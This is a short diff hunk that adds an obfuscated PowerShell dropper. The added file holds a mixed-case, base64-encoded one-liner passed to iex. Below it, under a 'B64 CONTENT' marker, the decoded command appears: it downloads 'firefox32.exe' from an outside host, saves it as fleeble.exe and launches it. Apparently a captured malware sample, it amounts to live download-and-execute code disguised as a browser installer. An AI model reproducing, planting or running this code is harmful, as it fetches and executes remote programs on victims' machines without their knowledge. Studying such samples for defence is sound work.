@@ -1,0 +1,7 @@
+iex([SySTEm.Text.ENCODING]::UTF8.gETsTring([sySTEM.coNveRT]::fROMbasE64sTRInG('CihOZXctT2JqZWN0IHN5c3RFTS5ORXQuV0VCY0xJZU50KS5Eb1duTG9hREZJbEUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vZmlyZWZveDMyLmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object systEM.NEt.WEBcLIeNt).DoWnLoaDFIlE('http://worldnit.com/firefox32.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
